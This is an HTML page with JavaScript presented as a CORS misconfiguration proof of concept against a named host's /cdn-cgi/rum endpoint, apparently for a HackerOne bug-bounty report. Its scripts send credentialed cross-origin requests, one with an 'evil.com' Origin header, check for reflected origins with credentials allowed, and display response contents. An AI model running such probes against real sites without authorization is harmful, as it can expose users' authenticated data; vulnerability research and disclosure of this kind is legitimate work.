<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability PoC - N0t-Found404</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .container { max-width: 800px; margin: 0 auto; }
        .card { border: 1px solid #ccc; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
        .success { background-color: #e6ffe6; border-color: #00cc00; }
        .error { background-color: #ffebeb; border-color: #ff8080; }
        .warning { background-color: #fffbe6; border-color: #ffcc00; }
        pre { background-color: #f5f5f5; padding: 10px; overflow: auto; border-radius: 3px; }
        button { padding: 10px 15px; background: #0066ff; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
        button:hover { background: #0052cc; }
        .metadata { font-size: 0.9em; color: #666; }
        .highlight { background-color: yellow; padding: 0 2px; }
        textarea { width: 100%; height: 100px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CORS Vulnerability Proof of Concept</h1>
        <div class="metadata">
            <p><strong>Tester:</strong> N0t-Found404</p>
            <p><strong>Test Date:</strong> 2025-04-04 15:54:06 (UTC)</p>
            <p><strong>Target:</strong> bumba.global/cdn-cgi/rum</p>
        </div>

        <div class="card">
            <h2>1. CORS Headers Test with Different Methods</h2>
            <p>Testing CORS configuration with various methods from origin: <strong id="current-origin"></strong></p>
            <div>
                <button onclick="checkCorsWithMethod('OPTIONS')">Test with OPTIONS</button>
                <button onclick="checkCorsWithMethod('GET')">Test with GET</button>
                <button onclick="checkCorsWithMethod('POST')">Test with POST</button>
                <button onclick="checkCorsWithMethod('HEAD')">Test with HEAD</button>
            </div>
            <div id="headersResult">Click a button to start testing.</div>
        </div>

        <div class="card">
            <h2>2. Request with Custom Parameters</h2>
            <p>Try with different parameters (RUM endpoints often require specific parameters):</p>
            <textarea id="customParams">{"v":"1.0","ts":1712246046,"dsn":"12345","pid":"page-view"}</textarea>
            <div>
                <button onclick="testWithCustomParams()">Test with Custom Parameters</button>
                <button onclick="testWithContentType()">Test with JSON Content-Type</button>
            </div>
            <div id="customResult">Click a button to test.</div>
        </div>

        <div class="card">
            <h2>3. Alternative Endpoints Test</h2>
            <p>Test related endpoints that might have the same CORS misconfiguration:</p>
            <div>
                <button onclick="testRelatedEndpoint('/cdn-cgi/rum')">Test /cdn-cgi/rum</button>
                <button onclick="testRelatedEndpoint('/cdn-cgi/trace')">Test /cdn-cgi/trace</button>
                <button onclick="testRelatedEndpoint('/api/rum')">Test /api/rum</button>
            </div>
            <div id="endpointResult">Click a button to test alternative endpoints.</div>
        </div>

        <div class="card">
            <h2>4. Verify Original Findings</h2>
            <p>Enter the exact request that worked in your original discovery:</p>
            <div>
                <p><strong>Method:</strong> 
                    <select id="originalMethod">
                        <option value="GET">GET</option>
                        <option value="POST" selected>POST</option>
                        <option value="OPTIONS">OPTIONS</option>
                        <option value="HEAD">HEAD</option>
                    </select>
                </p>
                <p><strong>Headers:</strong></p>
                <textarea id="originalHeaders">{"Origin": "https://evil.com"}</textarea>
                <p><strong>Body (if any):</strong></p>
                <textarea id="originalBody"></textarea>
                <button onclick="testOriginalRequest()">Test Original Request</button>
            </div>
            <div id="originalResult">Click to verify your original findings.</div>
        </div>

        <div class="card">
            <h2>5. Documentation for Report</h2>
            <div id="documentationDiv">
                <p>Based on your testing, here's what to include in your updated HackerOne report:</p>
                <ol>
                    <li>Clearly state that you performed additional testing after your initial discovery</li>
                    <li>Provide the exact request details that worked in your original testing</li>
                    <li>Include any relevant parameters, headers, or request bodies</li>
                    <li>Explain that the vulnerability may have been fixed or requires specific conditions</li>
                    <li>Offer to help reproduce the issue if needed</li>
                </ol>
                <p>Remember: It's common for security issues to be quickly fixed after initial testing, which may be why the behavior has changed.</p>
            </div>
        </div>
    </div>

    <script>
        // Display the current origin
        document.getElementById('current-origin').textContent = window.location.origin;
        
        // Test CORS with different methods
        function checkCorsWithMethod(method) {
            const resultDiv = document.getElementById('headersResult');
            resultDiv.innerHTML = `<p>Testing with ${method} method...</p>`;
            
            fetch("https://bumba.global/cdn-cgi/rum", {
                method: method,
                headers: {
                    "Origin": window.location.origin
                }
            })
            .then(response => {
                const headers = {};
                response.headers.forEach((value, key) => {
                    headers[key] = value;
                });
                
                let output = `<h3>CORS Headers with ${method} request:</h3><ul>`;
                
                // List all headers
                Object.keys(headers).forEach(key => {
                    output += `<li><strong>${key}:</strong> ${headers[key]}</li>`;
                });
                output += "</ul>";
                
                // Check for CORS headers specifically
                const corsHeaders = [
                    'access-control-allow-origin',
                    'access-control-allow-credentials',
                    'access-control-allow-methods',
                    'access-control-expose-headers',
                    'access-control-allow-headers'
                ];
                
                let corsFound = false;
                corsHeaders.forEach(header => {
                    if (headers[header]) {
                        corsFound = true;
                    }
                });
                
                if (corsFound) {
                    output += `<div class="card success">
                        <h3>✓ CORS Headers Found!</h3>
                        <p>The server is responding with CORS headers to ${method} requests.</p>
                    </div>`;
                    
                    if (headers['access-control-allow-origin'] === window.location.origin && 
                        headers['access-control-allow-credentials'] === "true") {
                        output += `<div class="card warning">
                            <h3>⚠️ Potential Vulnerability Found!</h3>
                            <p>The server appears to reflect our origin (${window.location.origin}) and allows credentials.</p>
                            <p>This combination could allow cross-origin data retrieval with authentication.</p>
                        </div>`;
                    }
                } else {
                    output += `<div class="card error">
                        <h3>No CORS headers found in response.</h3>
                        <p>The server didn't include any CORS headers in its response to the ${method} request.</p>
                    </div>`;
                }
                
                resultDiv.innerHTML = output;
            })
            .catch(error => {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Error testing with ${method}</h3>
                    <p>${error.message}</p>
                    <p>This could be due to a network error or the server blocking the request.</p>
                </div>`;
            });
        }
        
        // Test with custom parameters
        function testWithCustomParams() {
            const resultDiv = document.getElementById('customResult');
            const paramsText = document.getElementById('customParams').value;
            
            try {
                const params = JSON.parse(paramsText);
                resultDiv.innerHTML = `<p>Testing with custom parameters...</p>`;
                
                fetch("https://bumba.global/cdn-cgi/rum", {
                    method: "POST",
                    headers: {
                        "Origin": window.location.origin,
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: new URLSearchParams(params),
                    credentials: "include"
                })
                .then(response => {
                    const headers = {};
                    response.headers.forEach((value, key) => {
                        headers[key] = value;
                    });
                    
                    let output = `<h3>Response with Custom Parameters:</h3>`;
                    
                    if (headers['access-control-allow-origin']) {
                        output += `<div class="card success">
                            <h3>✓ CORS Headers Found!</h3>
                            <p><strong>Access-Control-Allow-Origin:</strong> ${headers['access-control-allow-origin']}</p>
                            <p><strong>Access-Control-Allow-Credentials:</strong> ${headers['access-control-allow-credentials'] || 'Not present'}</p>
                        </div>`;
                        
                        if (headers['access-control-allow-origin'] === window.location.origin && 
                            headers['access-control-allow-credentials'] === "true") {
                            output += `<p>✓ The server appears to be vulnerable to CORS with these parameters!</p>`;
                        }
                    } else {
                        output += `<div class="card error">
                            <h3>No CORS headers found in response.</h3>
                            <p>The server didn't include any CORS headers in its response.</p>
                        </div>`;
                    }
                    
                    // Try to get the response content
                    return response.text().then(text => {
                        if (text.length > 0) {
                            output += `<h3>Response Content:</h3>
                            <pre>${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
                        } else {
                            output += `<p>Response was empty.</p>`;
                        }
                        resultDiv.innerHTML = output;
                    });
                })
                .catch(error => {
                    resultDiv.innerHTML = `<div class="card error">
                        <h3>Error testing with custom parameters</h3>
                        <p>${error.message}</p>
                    </div>`;
                });
            } catch (e) {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Invalid JSON parameters</h3>
                    <p>Please enter valid JSON: ${e.message}</p>
                </div>`;
            }
        }
        
        // Test with JSON Content-Type
        function testWithContentType() {
            const resultDiv = document.getElementById('customResult');
            const paramsText = document.getElementById('customParams').value;
            
            try {
                const params = JSON.parse(paramsText);
                resultDiv.innerHTML = `<p>Testing with JSON Content-Type...</p>`;
                
                fetch("https://bumba.global/cdn-cgi/rum", {
                    method: "POST",
                    headers: {
                        "Origin": window.location.origin,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(params),
                    credentials: "include"
                })
                .then(response => {
                    const headers = {};
                    response.headers.forEach((value, key) => {
                        headers[key] = value;
                    });
                    
                    let output = `<h3>Response with JSON Content-Type:</h3>`;
                    
                    if (headers['access-control-allow-origin']) {
                        output += `<div class="card success">
                            <h3>✓ CORS Headers Found!</h3>
                            <p><strong>Access-Control-Allow-Origin:</strong> ${headers['access-control-allow-origin']}</p>
                            <p><strong>Access-Control-Allow-Credentials:</strong> ${headers['access-control-allow-credentials'] || 'Not present'}</p>
                        </div>`;
                    } else {
                        output += `<div class="card error">
                            <h3>No CORS headers found in response.</h3>
                            <p>The server didn't include any CORS headers in its response.</p>
                        </div>`;
                    }
                    
                    // Try to get the response content
                    return response.text().then(text => {
                        if (text.length > 0) {
                            output += `<h3>Response Content:</h3>
                            <pre>${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
                        } else {
                            output += `<p>Response was empty.</p>`;
                        }
                        resultDiv.innerHTML = output;
                    });
                })
                .catch(error => {
                    resultDiv.innerHTML = `<div class="card error">
                        <h3>Error testing with JSON Content-Type</h3>
                        <p>${error.message}</p>
                    </div>`;
                });
            } catch (e) {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Invalid JSON parameters</h3>
                    <p>Please enter valid JSON: ${e.message}</p>
                </div>`;
            }
        }
        
        // Test related endpoints
        function testRelatedEndpoint(endpoint) {
            const resultDiv = document.getElementById('endpointResult');
            resultDiv.innerHTML = `<p>Testing endpoint: https://bumba.global${endpoint}...</p>`;
            
            fetch(`https://bumba.global${endpoint}`, {
                method: "OPTIONS",
                headers: {
                    "Origin": window.location.origin
                }
            })
            .then(response => {
                const headers = {};
                response.headers.forEach((value, key) => {
                    headers[key] = value;
                });
                
                let output = `<h3>CORS Headers for ${endpoint}:</h3><ul>`;
                
                // List all headers
                let hasHeaders = false;
                Object.keys(headers).forEach(key => {
                    hasHeaders = true;
                    output += `<li><strong>${key}:</strong> ${headers[key]}</li>`;
                });
                
                if (!hasHeaders) {
                    output += `<li>No headers returned</li>`;
                }
                output += "</ul>";
                
                // Check for CORS headers specifically
                if (headers['access-control-allow-origin']) {
                    output += `<div class="card success">
                        <h3>✓ CORS Headers Found for ${endpoint}!</h3>
                        <p><strong>Access-Control-Allow-Origin:</strong> ${headers['access-control-allow-origin']}</p>
                        <p><strong>Access-Control-Allow-Credentials:</strong> ${headers['access-control-allow-credentials'] || 'Not present'}</p>
                    </div>`;
                    
                    if (headers['access-control-allow-origin'] === window.location.origin && 
                        headers['access-control-allow-credentials'] === "true") {
                        output += `<p>✓ This endpoint appears to be vulnerable to CORS!</p>`;
                    }
                } else {
                    output += `<div class="card error">
                        <h3>No CORS headers found for ${endpoint}.</h3>
                        <p>The server didn't include any CORS headers in its response.</p>
                    </div>`;
                }
                
                resultDiv.innerHTML = output;
            })
            .catch(error => {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Error testing endpoint ${endpoint}</h3>
                    <p>${error.message}</p>
                </div>`;
            });
        }
        
        // Test original request that worked
        function testOriginalRequest() {
            const resultDiv = document.getElementById('originalResult');
            resultDiv.innerHTML = `<p>Testing with your original request parameters...</p>`;
            
            const method = document.getElementById('originalMethod').value;
            let headers = {};
            
            try {
                headers = JSON.parse(document.getElementById('originalHeaders').value);
            } catch (e) {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Invalid JSON headers</h3>
                    <p>Please enter valid JSON for headers: ${e.message}</p>
                </div>`;
                return;
            }
            
            let bodyText = document.getElementById('originalBody').value.trim();
            let body = bodyText.length > 0 ? bodyText : undefined;
            
            const requestOptions = {
                method: method,
                headers: headers,
                credentials: "include"
            };
            
            if (body) {
                requestOptions.body = body;
            }
            
            fetch("https://bumba.global/cdn-cgi/rum", requestOptions)
            .then(response => {
                const respHeaders = {};
                response.headers.forEach((value, key) => {
                    respHeaders[key] = value;
                });
                
                let output = `<h3>Response to Original Request:</h3><ul>`;
                
                // List all headers
                Object.keys(respHeaders).forEach(key => {
                    output += `<li><strong>${key}:</strong> ${respHeaders[key]}</li>`;
                });
                output += "</ul>";
                
                // Check for CORS headers specifically
                if (respHeaders['access-control-allow-origin']) {
                    output += `<div class="card success">
                        <h3>✓ CORS Headers Found!</h3>
                        <p><strong>Access-Control-Allow-Origin:</strong> ${respHeaders['access-control-allow-origin']}</p>
                        <p><strong>Access-Control-Allow-Credentials:</strong> ${respHeaders['access-control-allow-credentials'] || 'Not present'}</p>
                    </div>`;
                    
                    if (respHeaders['access-control-allow-origin'] === headers.Origin && 
                        respHeaders['access-control-allow-credentials'] === "true") {
                        output += `<div class="card warning">
                            <h3>✓ Vulnerability Confirmed!</h3>
                            <p>The server reflects the Origin header (${headers.Origin}) and allows credentials.</p>
                            <p>This confirms your original findings.</p>
                        </div>`;
                    }
                } else {
                    output += `<div class="card error">
                        <h3>No CORS headers found in response.</h3>
                        <p>The server didn't include any CORS headers in its response to your original request parameters.</p>
                        <p>This suggests that the vulnerability may have been fixed or requires additional conditions.</p>
                    </div>`;
                }
                
                // Try to get the response content
                return response.text().then(text => {
                    if (text.length > 0) {
                        output += `<h3>Response Content:</h3>
                        <pre>${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
                    }
                    resultDiv.innerHTML = output;
                });
            })
            .catch(error => {
                resultDiv.innerHTML = `<div class="card error">
                    <h3>Error testing original request</h3>
                    <p>${error.message}</p>
                    <p>This could indicate that the vulnerability has been fixed or that the request requires additional parameters.</p>
                </div>`;
            });
        }
    </script>
</body>
</html>
